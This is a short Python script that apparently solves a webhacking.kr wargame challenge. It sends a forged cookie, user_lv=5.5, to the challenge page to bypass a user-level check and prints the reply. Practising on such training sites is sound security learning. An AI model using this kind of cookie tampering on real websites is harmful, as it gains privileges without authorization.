import requests

url = "http://webhacking.kr/challenge/web/web-01/index.php"

# request header
# dictionary
# user_lv 5.1 ~ 5.9
headers = {
	# key : value
	"Host": "webhacking.kr",
	"Cookie": "user_lv=5.5; oldzombie=1; PHPSESSID=Your PHPSESSIONID"
}

req = requests.get(url, headers=headers)

print req.content
